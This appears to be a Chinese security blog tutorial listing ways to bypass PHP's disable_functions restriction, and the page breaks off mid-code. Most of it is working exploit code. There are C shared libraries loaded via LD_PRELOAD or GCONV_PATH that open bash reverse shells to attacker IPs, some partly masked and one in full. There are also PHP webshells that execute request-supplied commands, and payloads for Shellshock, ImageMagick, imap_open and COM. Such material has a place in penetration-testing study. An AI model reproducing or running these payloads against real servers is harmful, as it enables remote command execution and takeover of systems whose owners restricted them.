title="利用LD_PRELOAD环境变量"></a>利用LD_PRELOAD环境变量</h2><p>查找php.ini中是否有遗漏的危险函数</p><div class="code-wrapper"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>,passthru,<span class="hljs-keyword">exec</span>,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,pcntl_exec</code></pre></div><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>讨论 LD_PRELOAD 前，先了解程序的链接。所谓链接，也就是说编译器找到程序中所引用的函数或全局变量所存在的位置。一般来说，程序的链接分为静态链接和动态链接。静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。</p><p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p><p>通过 ldd 命令可查看程序或者库文件所依赖的共享库列表，一般情况下，其加载顺序为</p><div class="code-wrapper"><pre><code class="hljs arcade">LD_PRELOAD &gt; LD_LIBRARY_PATH &gt; <span class="hljs-regexp">/etc/</span>ld.so.cache &gt; <span class="hljs-regexp">/lib &gt; /u</span>sr/lib</code></pre></div><h3 id="劫持函数"><a href="#劫持函数" class="headerlink" title="劫持函数"></a>劫持函数</h3><p>通过<code>putenv()</code>函数将LD_PRELOAD设置为指定恶意动态链接库(.so)文件路径，利用其<strong>加载优先级高</strong>劫持任意函数执行的内容</p><p>这里以 mail() 为例，mail 函数是一个发送邮件的函数，当使用到这玩意儿发送邮件时会使用到系统程序<code>/usr/sbin/sendmail</code>，我们如果能劫持到 sendmail 触发的函数，那么就可以达到执行任意系统命令的目的了。</p><p>可以使用<code>readelf -Ws /usr/sbin/sendmail</code>命令查看 sendmail 命令可能调用的库函数，<code>strace -f</code>可查看具体执行过程中调用的函数，这里拿 <code>geteuid()</code> 函数为例</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.42.xx.xx/23333 0&gt;&amp;&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-comment">// 还原函数调用关系，用函数 unsetenv() 解除</span>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>); /    <span class="hljs-built_in">payload</span>();&#125;</code></pre></div><p>将 c 编译为动态链接库</p><div class="code-wrapper"><pre><code class="hljs angelscript">gcc hack.c -<span class="hljs-keyword">shared</span> -fPIC -o hack.so</code></pre></div><p>然后执行php函数</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>); <span class="hljs-comment">// 编译.c文件后的.so文件位置</span>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>与此类似的php函数还有error_log()和mb_send_mail()</p><div class="code-wrapper"><pre><code class="hljs lisp">error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span>mb_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><h3 id="预加载共享对象"><a href="#预加载共享对象" class="headerlink" title="预加载共享对象"></a>预加载共享对象</h3><p>系统通过LD_PRELOAD预先加载共享对象，如果在加载时就执行代码，就不用劫持函数以此绕过disable_function。GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>__attribute__ ((constructor)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span> <span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/118.89.61.71/7777 &lt;&amp;1&#x27;&quot;</span>);&#125;</code></pre></div><h3 id="利用socket进行连接"><a href="#利用socket进行连接" class="headerlink" title="利用socket进行连接"></a>利用socket进行连接</h3><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-type">char</span> *server_ip = <span class="hljs-string">&quot;vps&quot;</span>;<span class="hljs-type">uint32_t</span> server_port = <span class="hljs-number">114514</span>;<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">int</span> sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> attacker_addr = &#123;<span class="hljs-number">0</span>&#125;;    attacker_addr.sin_family = AF_INET;    attacker_addr.sin_port = <span class="hljs-built_in">htons</span>(server_port);    attacker_addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(server_ip);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;attacker_addr, <span class="hljs-built_in">sizeof</span>(attacker_addr)) != <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">0</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">1</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">2</span>);    <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);&#125;</code></pre></div><h2 id="利用GCONV-PATH环境变量-需要两个文件"><a href="#利用GCONV-PATH环境变量-需要两个文件" class="headerlink" title="利用GCONV_PATH环境变量  (需要两个文件)"></a>利用GCONV_PATH环境变量  (需要两个文件)</h2><p>GCONV_PATH能够使glibc使用用户自定义的<code>gconv_modules</code>文件。<code>gconv_modules</code>文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个<code>.so</code>文件中，即<code>gconv_modules</code>文件提供了各个字符集的<code>.so</code>文件所在位置</p><p>PHP的iconv函数的第一个参数是字符集的名字，这个参数会传递到glibc的<code>iconv_open</code>函数的参数中，<code>iconv_open</code>函数依照<code>GCONV_PATH</code>找到<code>gconv_modules</code>文件的知识找到参数对应的<code>.so</code>文件，然后调用.so文件中的<code>gconv()</code>和<code>gconv_init()</code></p><div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-type">void</span> <span class="hljs-title function_">gconv</span><span class="hljs-params">()</span>&#123;&#125;<span class="hljs-type">void</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span>&#123;    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxxx/xxxx 0&gt;&amp;1&#x27;&quot;</span>);&#125;</code></pre></div><p>编译为so文件</p><div class="code-wrapper"><pre><code class="hljs c">gcc <span class="hljs-built_in">exp</span>.c -shared -fPIC -o <span class="hljs-built_in">exp</span>.so</code></pre></div><p>可写目录创建gconv_modules文件</p><div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//PAYLOAD为字符集名称</span>module  PAYLOAD<span class="hljs-comment">//  INTERNAL     /tmp/exp    2</span>module  INTERNAL   PAYLOAD<span class="hljs-comment">//    /tmp/exp    2</span>    <span class="hljs-comment">//exp为字符集名称</span>module  <span class="hljs-built_in">exp</span><span class="hljs-comment">//  INTERNAL     /tmp/exp    2</span>module  INTERNAL   <span class="hljs-built_in">exp</span><span class="hljs-comment">//    /tmp/exp    2</span></code></pre></div><p>然后php代码触发</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);        <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);    <span class="hljs-comment">//第一个为对应的字符集名称</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);<span class="hljs-title function_ invoke__">iconv_strlen</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);      <span class="hljs-comment">//第二个为对应的字符集名称</span><span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);     <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#x27;</span>);    <span class="hljs-comment">//定义的字符集名称放在iconv后面</span><span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="利用-ShellShock-（env解析为函数）"><a href="#利用-ShellShock-（env解析为函数）" class="headerlink" title="利用 ShellShock   （env解析为函数）"></a>利用 ShellShock   （env解析为函数）</h2><p>该方法利用的Bash Shellshock 破壳漏洞（CVE-2014-6271）</p><ul><li>php &lt; 5.6.2</li><li>bash &lt;&#x3D; 4.3</li></ul><p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>命令行输入<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>      <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>);    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>);    <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);      <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span>   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span>   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span>   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span>            <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>);    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span> != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; &#125; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shellshock</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_flag=() &#123; :; &#125;; ls / &gt; /tmp/t.txt&quot;</span>);<span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p><p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。</p><p>若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGIAddHandler cgi-script .<span class="hljs-keyword">ant</span></code></pre></div><p>由于CGI程序可以执行命令，那我们可以利用CGI来执行系统命令绕过disable_functions。</p><p>上传shell.ant</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">type</span>: text/html<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">id</span></code></pre></div><h2 id="FastCGI-PHP-FPM"><a href="#FastCGI-PHP-FPM" class="headerlink" title="FastCGI&#x2F;PHP-FPM"></a>FastCGI&#x2F;PHP-FPM</h2><p>FastCGI，它每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。</p><p>FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和FPM进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。</p><p>通过PHP-FPM的环境变量<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>设置php.ini配置项，通过配置项<code>auto_prepend_file</code>和<code>auto_append_file</code>结合<code>php://input</code>包含任意php代码并执行，并且修改了远程文件包含选项<code>allow_url_include</code>为on</p><div class="code-wrapper"><pre><code class="hljs 1c">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;</code></pre></div><h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><p>在 ImageMagick 的默认配置文件 &#x2F;etc&#x2F;ImageMagick&#x2F;delegates.xml 里可以看到所有的委托。这个文件定义了很多占位符，比如 %i 是输入的文件名，%l 是图片exif label信息。而在后面 command 的位置，%i 和 %l 等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号或闭合双引号，来执行任意命令。如果在phpinfo中看到有这个ImageMagick，可以尝试一下</p><ul><li>Imagemagick &lt; 6.9.3-10</li><li>Imagemagick &lt; 7.0.1-1</li><li>PHP &gt;&#x3D; 5.4</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;&#125;<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><span class="hljs-string">push graphic-context</span><span class="hljs-string">viewbox 0 0 640 480</span><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><span class="hljs-string">pop graphic-context</span><span class="hljs-string">EOF</span>;<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="imap-open-绕过"><a href="#imap-open-绕过" class="headerlink" title="imap_open()绕过"></a>imap_open()绕过</h2><ul><li>安装了imap扩展</li><li>imap.enable_insecure_rsh选项为On。</li></ul><p>imap_open函数在将邮箱名称传递给rsh或ssh命令之前没有正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，可以发送包含<code>-oProxyCommand</code>参数的恶意IMAP服务器名称来利用此漏洞</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imap_open&#x27;</span>)) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no imap_open function!&quot;</span>); &#125; <span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;x -oProxyCommand=echo\t&quot;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] . <span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&quot;|base64\t-d|sh&#125;&quot;</span>; <span class="hljs-comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .&quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;; </span><span class="hljs-title function_ invoke__">imap_open</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span> . <span class="hljs-variable">$server</span> . <span class="hljs-string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// or</span><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;nnError: &quot;</span>.<span class="hljs-title function_ invoke__">imap_last_error</span>()); <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/cmd_result&quot;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="Windows组件COM绕过"><a href="#Windows组件COM绕过" class="headerlink" title="Windows组件COM绕过"></a>Windows组件COM绕过</h2><p>COM component（COM组件）是微软开发的软件开发技术。其实质是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。而在php中如果想要引用第三方动态库，需要通过 <code>new COM(“Component.class”)</code> 的方法来实现，其中的 Component 必须是COM组件</p><ul><li>要求 <code>com.allow_dcom = true</code></li><li>目标服务器为Windows系统</li><li>在php&#x2F;ext&#x2F;目录下存在php_com_dotnet.dll这个文件</li></ul><p><code>com.allow_dcom</code>默认是不开启的，PHP 7版本开始要自己添加扩展<code>extension=php_com_dotnet.dll</code></p><p>创建一个COM对象,通过调用COM对象的<code>exec</code>替我们执行命令</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">ShellExecute</span>(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);&#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="劫持got表绕过"><a href="#劫持got表绕过" class="headerlink" title="劫持got表绕过"></a>劫持got表绕过</h2><p>在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。简单说就是，函数第一次用到的时候才会把在自己的真实地址给写到相应的got表里，没用到就不绑定了。这就是<strong>延迟绑定</strong>，由于这个机制，第一次调用函数的时候，got表中“存放”的地址不是函数的真实地址，而是<code>plt</code> 表中的第二条汇编指令，接下来会进行一系列操作装载相应的动态链接库，将函数的真实地址写在got表中。以后调用该函数时，got表保存着其真实地址。</p><p>这里劫持got表就是修改函数的got表的地址的内容为我们的shellcode的地址</p><ul><li>step 1:通过php脚本解析<code>/proc/self/exe</code>得到open函数的got表的地址。</li><li>step 2:通过读取<code>/proc/self/maps</code>得到程序基地址，栈地址，与libc基地址。</li><li>step 3:通过php脚本解析libc得到system函数的地址，结合libc基地址（两者相加）可以得到system函数的实际地址。</li><li>step 4:通过读写<code>/proc/self/mem</code>实现修改open函数的got表的地址的内容为我们的shellcode的地址。向我们指定的shellcode的地址写入我们的shellcode。</li></ul><p>exp（命令无回显，如果没有权限读写&#x2F;proc&#x2F;self&#x2F;mem，自然也就无法利用了）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/***</span><span class="hljs-comment"> *</span><span class="hljs-comment">* BUG修正请联系我</span><span class="hljs-comment">* <span class="hljs-doctag">@author</span></span><span class="hljs-comment">* <span class="hljs-doctag">@email</span> xiaozeend<span class="hljs-doctag">@pm</span>.me *</span><span class="hljs-comment">*/</span><span class="hljs-comment">/*</span><span class="hljs-comment">section tables type</span><span class="hljs-comment">*/</span><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NULL&#x27;</span>,<span class="hljs-number">0</span>);<span 